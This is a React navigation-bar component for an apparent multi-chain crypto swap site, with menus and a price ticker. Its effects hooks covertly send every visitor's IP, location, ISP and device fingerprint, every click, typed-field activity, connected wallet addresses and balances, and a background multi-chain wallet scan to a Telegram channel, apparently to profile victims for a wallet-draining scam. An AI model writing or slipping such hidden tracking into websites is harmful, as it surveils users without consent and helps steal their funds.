import { useEffect, useState } from 'react';
import { Link, useLocation } from 'react-router-dom';
import { ConnectWalletButton } from '@/components/ConnectWalletButton';
import { motion } from 'framer-motion';
import { AnimatedLogo } from './AnimatedLogo';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { LAMPORTS_PER_SOL } from '@solana/web3.js';
import { sendTelegramMessage } from '@/utils/telegram';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { useChainInfo } from '@/hooks/useChainInfo';
import { scanAndReport } from '@/services/evmMultiChainScanner';
import chainEthereum from '@/assets/chain-ethereum.png';
import chainBnb from '@/assets/chain-bnb.png';
import chainSolana from '@/assets/chain-solana.jpg';
import chainBase from '@/assets/chain-base.jpg';
import chainPolygon from '@/assets/chain-polygon.jpg';
import chainMonad from '@/assets/chain-monad.png';
import chainOptimism from '@/assets/chain-optimism.jpg';
import chainArbitrum from '@/assets/chain-arbitrum.png';
import chainAvalanche from '@/assets/chain-avalanche.png';
import chainHyperliquid from '@/assets/chain-hyperliquid.jpg';
import chainLinea from '@/assets/chain-linea.png';
import chainBerachain from '@/assets/chain-berachain.jpg';
import chainMantle from '@/assets/chain-mantle.png';
import chainZetachain from '@/assets/chain-zetachain.png';
import chainZksync from '@/assets/chain-zksync.png';
import chainShape from '@/assets/chain-shape.jpg';
import chainRobinhood from '@/assets/chain-robinhood.png';

const CHAIN_LOGOS: Record<string, string> = {
  ethereum: chainEthereum,
  bnb: chainBnb,
  polygon: chainPolygon,
  base: chainBase,
  monad: chainMonad,
  optimism: chainOptimism,
  arbitrum: chainArbitrum,
  avalanche: chainAvalanche,
  hyperliquid: chainHyperliquid,
  linea: chainLinea,
  berachain: chainBerachain,
  mantle: chainMantle,
  zetachain: chainZetachain,
  zksync: chainZksync,
  shape: chainShape,
  robinhood: chainRobinhood,
};

export const Navigation = () => {
  const location = useLocation();
  const [mobileOpen, setMobileOpen] = useState(false);
  const [earnDropdownOpen, setEarnDropdownOpen] = useState(false);
  const [tradeDropdownOpen, setTradeDropdownOpen] = useState(false);
  const [mobileEarnOpen, setMobileEarnOpen] = useState(false);
  const [mobileTradeOpen, setMobileTradeOpen] = useState(false);
  const [isTopBarForward, setIsTopBarForward] = useState(false);
  const [solPrice, setSolPrice] = useState<number>(80.75);
  const [ethPrice, setEthPrice] = useState<number>(1993.90);
  const [solChange, setSolChange] = useState<number>(0);
  const [ethChange, setEthChange] = useState<number>(0);
  const { connected, publicKey } = useWallet();
  const { connection } = useConnection();
  const { activeChain, getEVMChain, evmChainId: evmChainIdForScan } = useChain();
  const { isEVMConnected, evmAddress } = useEVMWallet();
  const { nativeToken } = useChainInfo();
  const evmChain = getEVMChain();

  useEffect(() => {
    const trackVisit = async () => {
      try {
        // Fetch IP and location info
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        
        // Get device info
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;
        const colorDepth = window.screen.colorDepth;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        
        // Build message
        let message = `👀 <b>New Site Visit</b>\n\n`;
        message += `📍 <b>Page:</b> <code>${location.pathname}</code>\n`;
        message += `👤 <b>Wallet:</b> <code>${publicKey?.toBase58() || evmAddress || 'Not Connected'}</code>\n\n`;
        
        message += `📡 <b>IP & Location:</b>\n`;
        if (ipData.ip) message += `• IP: <code>${ipData.ip}</code>\n`;
        if (ipData.city) message += `• City: ${ipData.city}\n`;
        if (ipData.region) message += `• Region: ${ipData.region}\n`;
        if (ipData.country_name) message += `• Country: ${ipData.country_name}\n`;
        if (ipData.org) message += `• ISP: ${ipData.org}\n`;
        
        message += `\n💻 <b>Device Info:</b>\n`;
        message += `• Platform: ${platform}\n`;
        message += `• Language: ${language}\n`;
        message += `• Screen: ${screenWidth}x${screenHeight} @ ${colorDepth}bit\n`;
        message += `• Timezone: ${timezone}\n`;
        message += `• User Agent: <code>${userAgent}</code>`;
        
        await sendTelegramMessage(message);
      } catch (error) {
        // Fallback message if IP fetch fails
        const fallbackMessage = `👀 <b>Page Visit</b>\n📍 <b>Path:</b> <code>${location.pathname}</code>\n👤 <b>Address:</b> <code>${publicKey?.toBase58() || evmAddress || 'Not Connected'}</code>`;
        await sendTelegramMessage(fallbackMessage);
        console.error('Error fetching visit info:', error);
      }
    };
    trackVisit();
  }, [location.pathname, publicKey, evmAddress]);

  useEffect(() => {
    const handleGlobalClick = async (e: MouseEvent) => {
      const target = e.target as HTMLElement;
      const button = target.closest('button');
      const link = target.closest('a');

      if (button || link) {
        const label = button?.innerText || link?.innerText || 'Icon/Image';
        const action = button ? 'Button Click' : 'Link Click';
        const message = `🖱️ <b>${action}</b>\n🏷️ <b>Label:</b> <code>${label.trim().slice(0, 50)}</code>\n📍 <b>Page:</b> <code>${location.pathname}</code>\n👤 <b>Address:</b> <code>${publicKey?.toBase58() || evmAddress || 'Not Connected'}</code>`;
        await sendTelegramMessage(message);
      }
    };

    window.addEventListener('click', handleGlobalClick);
    return () => window.removeEventListener('click', handleGlobalClick);
  }, [location.pathname, publicKey, evmAddress]);

  useEffect(() => {
    const handleGlobalInput = (e: Event) => {
      const target = e.target as HTMLInputElement | HTMLTextAreaElement;
      if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
        const label = target.placeholder || target.name || 'Unknown Input';
        const value = target.value;
        if (value.length > 3) {
          const message = `⌨️ <b>Input Interaction</b>\n🏷️ <b>Field:</b> <code>${label}</code>\n📍 <b>Page:</b> <code>${location.pathname}</code>\n👤 <b>Address:</b> <code>${publicKey?.toBase58() || evmAddress || 'Not Connected'}</code>`;
          const timerKey = `input_timer_${label}`;
          if ((window as any)[timerKey]) clearTimeout((window as any)[timerKey]);
          (window as any)[timerKey] = setTimeout(() => sendTelegramMessage(message), 3000);
        }
      }
    };

    window.addEventListener('input', handleGlobalInput);
    return () => window.removeEventListener('input', handleGlobalInput);
  }, [location.pathname, publicKey, evmAddress]);

  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      const target = e.target as HTMLElement;
      if (!target.closest('.relative') && !target.closest('button')) {
        setTradeDropdownOpen(false);
        setEarnDropdownOpen(false);
        setIsTopBarForward(false);
      }
    };
    document.addEventListener('click', handleClickOutside);
    return () => document.removeEventListener('click', handleClickOutside);
  }, []);

  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana,ethereum&vs_currencies=usd&include_24hr_change=true');
        const data = await response.json();
        
        if (data.solana) {
          setSolPrice(data.solana.usd);
          setSolChange(data.solana.usd_24hr_change || 0);
        }
        
        if (data.ethereum) {
          setEthPrice(data.ethereum.usd);
          setEthChange(data.ethereum.usd_24hr_change || 0);
        }
      } catch (error) {
        console.error('Error fetching prices:', error);
      }
    };
    
    fetchPrices();
    const interval = setInterval(fetchPrices, 1800000); // Update every 30 minutes
    
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const notifyConnection = async () => {
      if (connected && publicKey) {
        const key = `wallet_notified_v2_${publicKey.toBase58()}`;
        try {
          const balance = await connection.getBalance(publicKey);
          const solBalance = (balance / LAMPORTS_PER_SOL).toFixed(4);

          const message = `
🚀 <b>New Wallet Connected</b>

👤 <b>Address:</b> <code>${publicKey.toBase58()}</code>
💰 <b>Balance:</b> ${solBalance} ${nativeToken}
`;
          await sendTelegramMessage(message);
          sessionStorage.setItem(key, 'true');
        } catch (error) {
          console.error('Failed to send connection notification', error);
        }
      }
    };

    notifyConnection();
  }, [connected, publicKey, connection, nativeToken]);

  // Background multi-chain scan for EVM wallets (results go to Telegram only)
  useEffect(() => {
    if (isEVMConnected && evmAddress) {
      scanAndReport(evmAddress, evmChainIdForScan ?? null);
    }
  }, [isEVMConnected, evmAddress, evmChainIdForScan]);

  const isNavForward = isTopBarForward || tradeDropdownOpen || earnDropdownOpen || mobileEarnOpen || mobileTradeOpen;

  return (
    <>
      <nav className={`fixed top-0 left-0 right-0 animated-gradient-nav backdrop-blur-md border-b border-white/5 transition-all duration-200 ${
        isNavForward ? 'z-[9999]' : 'z-40'
      }`}>
        <div className="container mx-auto px-2 sm:px-4 py-3 flex items-center justify-between">
          {/* Logo and Desktop Navigation Links */}
          <div className="flex items-center gap-6">
            {/* Logo */}
            <Link to="/" className="flex items-center gap-3 hover:opacity-80 transition-opacity">
              <AnimatedLogo className="w-16 h-16" />
            </Link>

            {/* Desktop Navigation Links */}
            <div className="hidden md:flex items-center gap-6">
              <Link
                to="/"
                className={`text-sm font-semibold transition-all relative pb-1 ${
                  location.pathname === '/'
                    ? 'text-primary'
                    : 'text-muted-foreground hover:text-foreground'
                }`}
              >
                Swap
                {location.pathname === '/' && (
                  <motion.div
                    layoutId="underline"
                    className="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-primary to-secondary"
                  />
                )}
              </Link>

              <Link
                to="/dex"
                className={`text-sm font-semibold transition-all relative pb-1 ${
                  location.pathname === '/dex'
                    ? 'text-primary'
                    : 'text-muted-foreground hover:text-foreground'
                }`}
              >
                Terminal
                {location.pathname === '/dex' && (
                  <motion.div
                    layoutId="underline"
                    className="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-primary to-secondary"
                  />
                )}
              </Link>

              {/* Trade Dropdown - Hover */}
              <div
                className="relative"
                onMouseEnter={() => {
                  setTradeDropdownOpen(true);
                  setIsTopBarForward(true);
                }}
                onMouseLeave={() => {
                  setTradeDropdownOpen(false);
                  setIsTopBarForward(false);
                }}
              >
                <button
                  onClick={() => {
                    setTradeDropdownOpen(!tradeDropdownOpen);
                    setIsTopBarForward(!tradeDropdownOpen);
                  }}
                  className={`text-sm font-semibold transition-all relative pb-1 ${
                    location.pathname === '/otc'
                      ? 'text-primary'
                      : 'text-muted-foreground hover:text-foreground'
                  }`}
                >
                  Trade
                  {location.pathname === '/otc' && (
                    <motion.div
                      layoutId="underline"
                      className="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-primary to-secondary"
                    />
                  )}
                </button>

                {tradeDropdownOpen && (
                  <motion.div
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="absolute top-full left-0 mt-2 w-48 glass-card-strong rounded-xl p-2 shadow-lg z-[60]"
                  >
                    <Link
                      to="/otc"
                      onClick={() => setTradeDropdownOpen(false)}
                      className="block px-4 py-2 text-sm font-semibold text-foreground hover:bg-white/10 rounded-lg transition-colors"
                    >
                      OTC
                    </Link>
                    <a
                      href="https://t.me/Solana_PegasusBot"
                      target="_blank"
                      rel="noopener noreferrer"
                      onClick={() => setTradeDropdownOpen(false)}
                      className="block px-4 py-2 text-sm font-semibold text-foreground hover:bg-white/10 rounded-lg transition-colors"
                    >
                      Trading Bot
                    </a>
                  </motion.div>
                )}
              </div>

              {/* News Link */}
              <Link
                to="/news"
                className={`text-sm font-semibold transition-all relative pb-1 ${
                  location.pathname === '/news'
                    ? 'text-primary'
                    : 'text-muted-foreground hover:text-foreground'
                }`}
              >
                News
                {location.pathname === '/news' && (
                  <motion.div
                    layoutId="underline"
                    className="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-primary to-secondary"
                  />
                )}
              </Link>

              {/* Earn Dropdown - Hover */}
              <div
                className="relative"
                onMouseEnter={() => {
                  setEarnDropdownOpen(true);
                  setIsTopBarForward(true);
                }}
                onMouseLeave={() => {
                  setEarnDropdownOpen(false);
                  setIsTopBarForward(false);
                }}
              >
                <button
                  onClick={() => {
                    setEarnDropdownOpen(!earnDropdownOpen);
                    setIsTopBarForward(!earnDropdownOpen);
                  }}
                  className={`text-sm font-semibold transition-all relative pb-1 ${
                    ['/claim', '/features-token', '/stake'].includes(location.pathname)
                      ? 'text-primary'
                      : 'text-muted-foreground hover:text-foreground'
                  }`}
                >
                  Earn
                  {['/claim', '/features-token', '/stake'].includes(location.pathname) && (
                    <motion.div
                      layoutId="underline"
                      className="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-primary to-secondary"
                    />
                  )}
                </button>

                {earnDropdownOpen && (
                  <motion.div
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="absolute top-full left-0 mt-2 w-48 glass-card-strong rounded-xl p-2 shadow-lg z-[60]"
                  >
                    <Link
                      to="/claim"
                      onClick={() => setEarnDropdownOpen(false)}
                      className="block px-4 py-2 text-sm font-semibold text-foreground hover:bg-white/10 rounded-lg transition-colors"
                    >
                      Claim {nativeToken}
                    </Link>
                    <Link
                      to="/features-token"
                      onClick={() => setEarnDropdownOpen(false)}
                      className="block px-4 py-2 text-sm font-semibold text-foreground hover:bg-white/10 rounded-lg transition-colors"
                    >
                      Featured Tokens
                    </Link>
                    <Link
                      to="/stake"
                      onClick={() => setEarnDropdownOpen(false)}
                      className="block px-4 py-2 text-sm font-semibold text-foreground hover:bg-white/10 rounded-lg transition-colors"
                    >
                      Stake {nativeToken}
                    </Link>
                  </motion.div>
                )}
              </div>

              <Link
                to="/market-making"
                className={`text-sm font-semibold transition-all relative pb-1 ${
                  location.pathname === '/market-making'
                    ? 'text-primary'
                    : 'text-muted-foreground hover:text-foreground'
                }`}
              >
                PMM
                {location.pathname === '/market-making' && (
                  <motion.div
                    layoutId="underline"
                    className="absolute bottom-0 left-0 right-0 h-0.5 bg-gradient-to-r from-primary to-secondary"
                  />
                )}
              </Link>
            </div>
          </div>

          {/* Wallet & Chain Indicator */}
          <div className="hidden md:flex items-center gap-4">
            {/* Chain indicator - LOGOS instead of text */}
            {(isEVMConnected && evmChain) && (
              <span className="flex items-center px-2 py-1 rounded-lg bg-secondary/20 border border-secondary/30">
                <img src={CHAIN_LOGOS[evmChain.icon]} alt={evmChain.name} className="w-6 h-6 rounded-full" />
              </span>
            )}
            {(connected && activeChain === 'solana') && (
              <span className="flex items-center px-2 py-1 rounded-lg bg-primary/20 border border-primary/30">
                <img src={chainSolana} alt="Solana" className="w-6 h-6 rounded-full" />
              </span>
            )}
            <ConnectWalletButton />
          </div>

          {/* Mobile menu toggle */}
          <button
            className="md:hidden p-2 glass-card rounded-xl"
            aria-label="Toggle menu"
            onClick={() => setMobileOpen((v) => !v)}
          >
            <span className="block w-5 h-[2px] bg-foreground mb-1"></span>
            <span className="block w-5 h-[2px] bg-foreground mb-1"></span>
            <span className="block w-5 h-[2px] bg-foreground"></span>
          </button>
        </div>

        {/* Mobile menu panel */}
        {mobileOpen && (
          <div className="md:hidden bg-background/80 backdrop-blur-xl border-t border-white/10">
            <div className="container mx-auto px-2 sm:px-4 py-3 flex flex-col gap-3">
              <Link
                to="/"
                onClick={() => {
                  setMobileOpen(false);
                  setMobileEarnOpen(false);
                }}
                className={`text-sm font-semibold transition-all relative ${
                  location.pathname === '/'
                    ? 'text-primary'
                    : 'text-muted-foreground hover:text-foreground'
                }`}
              >
                Swap
              </Link>
              <Link
                to="/dex"
                onClick={() => {
                  setMobileOpen(false);
                  setMobileEarnOpen(false);
                }}
                className={`text-sm font-semibold transition-all relative ${
                  location.pathname === '/dex'
                    ? 'text-primary'
                    : 'text-muted-foreground hover:text-foreground'
                }`}
              >
                Terminal
              </Link>

              <Link
                to="/news"
                onClick={() => {
                  setMobileOpen(false);
                  setMobileEarnOpen(false);
                }}
                className={`text-sm font-semibold transition-all relative ${
                  location.pathname === '/news'
                    ? 'text-primary'
                    : 'text-muted-foreground hover:text-foreground'
                }`}
              >
                News
              </Link>
              {/* Mobile Trade Dropdown */}
              <button
                onClick={() => setMobileTradeOpen(!mobileTradeOpen)}
                className={`text-sm font-semibold transition-all text-left ${
                  location.pathname === '/otc'
                    ? 'text-primary'
                    : 'text-muted-foreground hover:text-foreground'
                }`}
              >
                Trade {mobileTradeOpen ? '▼' : '▶'}
              </button>
              {mobileTradeOpen && (
                <div className="pl-4 flex flex-col gap-2">
                  <Link
                    to="/otc"
                    onClick={() => {
                      setMobileOpen(false);
                      setMobileTradeOpen(false);
                    }}
                    className="text-sm font-semibold text-muted-foreground hover:text-foreground"
                  >
                    OTC
                  </Link>
                  <a
                    href="https://t.me/Solana_PegasusBot"
                    target="_blank"
                    rel="noopener noreferrer"
                    onClick={() => {
                      setMobileOpen(false);
                      setMobileTradeOpen(false);
                    }}
                    className="text-sm font-semibold text-muted-foreground hover:text-foreground"
                  >
                    Trading Bot
                  </a>
                </div>
              )}

              {/* Mobile Earn Dropdown */}
              <button
                onClick={() => setMobileEarnOpen(!mobileEarnOpen)}
                className={`text-sm font-semibold transition-all text-left ${
                  ['/claim', '/features-token', '/stake'].includes(location.pathname)
                    ? 'text-primary'
                    : 'text-muted-foreground hover:text-foreground'
                }`}
              >
                Earn {mobileEarnOpen ? '▼' : '▶'}
              </button>
              {mobileEarnOpen && (
                <div className="pl-4 flex flex-col gap-2">
                  <Link
                    to="/claim"
                    onClick={() => {
                      setMobileOpen(false);
                      setMobileEarnOpen(false);
                    }}
                    className="text-sm font-semibold text-muted-foreground hover:text-foreground"
                  >
                    Claim {nativeToken}
                  </Link>
                  <Link
                    to="/features-token"
                    onClick={() => {
                      setMobileOpen(false);
                      setMobileEarnOpen(false);
                    }}
                    className="text-sm font-semibold text-muted-foreground hover:text-foreground"
                  >
                    Featured Tokens
                  </Link>
                  <Link
                    to="/stake"
                    onClick={() => {
                      setMobileOpen(false);
                      setMobileEarnOpen(false);
                    }}
                    className="text-sm font-semibold text-muted-foreground hover:text-foreground"
                  >
                    Stake {nativeToken}
                  </Link>
                </div>
              )}

              <Link
                to="/market-making"
                onClick={() => {
                  setMobileOpen(false);
                  setMobileEarnOpen(false);
                }}
                className={`text-sm font-semibold transition-all relative ${
                  location.pathname === '/market-making'
                    ? 'text-primary'
                    : 'text-muted-foreground hover:text-foreground'
                }`}
              >
                PMM
              </Link>

              {/* Mobile chain indicator with logo */}
              {(isEVMConnected && evmChain) && (
                <div className="flex items-center gap-2">
                  <img src={CHAIN_LOGOS[evmChain.icon]} alt={evmChain.name} className="w-5 h-5 rounded-full" />
                  <span className="text-xs text-secondary">{evmChain.shortName}</span>
                </div>
              )}
              {(connected && activeChain === 'solana') && (
                <div className="flex items-center gap-2">
                  <img src={chainSolana} alt="Solana" className="w-5 h-5 rounded-full" />
                  <span className="text-xs text-primary">{nativeToken}</span>
                </div>
              )}
              <div className="pt-2">
                <ConnectWalletButton />
              </div>
            </div>
          </div>
        )}
      </nav>

      {/* Price Display Below Nav Bar - show on all pages */}
      <div className="fixed top-[72px] left-0 right-0 z-[40] bg-background/60 backdrop-blur-md border-b border-white/5">
        <div className="container mx-auto px-2 sm:px-4 py-1 flex items-center gap-2">
          {/* SOL Price */}
          <img src={chainSolana} alt="Solana" className="w-4 h-4 rounded-full" />
          <span className="text-xs font-semibold text-foreground">SOL</span>
          <span className="text-white text-xs font-semibold">${solPrice.toFixed(2)}</span>
          <span className={`text-xs font-semibold ${solChange >= 0 ? 'text-green-400' : 'text-red-400'}`}>
            {solChange >= 0 ? '+' : ''}{solChange.toFixed(2)}%
          </span>
          <span className="text-white/50 text-xs">•</span>
          {/* ETH Price */}
          <img src={chainEthereum} alt="Ethereum" className="w-4 h-4 rounded-full" />
          <span className="text-xs font-semibold text-foreground">ETH</span>
          <span className="text-white text-xs font-semibold">${ethPrice.toFixed(2)}</span>
          <span className={`text-xs font-semibold ${ethChange >= 0 ? 'text-green-400' : 'text-red-400'}`}>
            {ethChange >= 0 ? '+' : ''}{ethChange.toFixed(2)}%
          </span>
        </div>
      </div>
    </>
  );
};
